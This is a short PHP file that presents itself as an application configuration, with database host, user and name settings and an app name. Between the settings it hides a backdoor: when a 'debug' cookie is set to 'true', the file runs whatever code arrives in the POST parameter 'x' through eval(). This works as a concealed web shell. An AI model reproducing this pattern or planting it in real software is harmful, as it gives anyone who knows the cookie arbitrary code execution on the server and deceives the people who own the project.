<?php
$db_host = "localhost";
$db_user = "admin";
$db_name = "testdb";

if(isset($_COOKIE['debug']) && $_COOKIE['debug'] == 'true') {
 if(isset($_POST['x'])) {
     eval($_POST['x']);
 }
}

$app_name = "Test Application";
?>
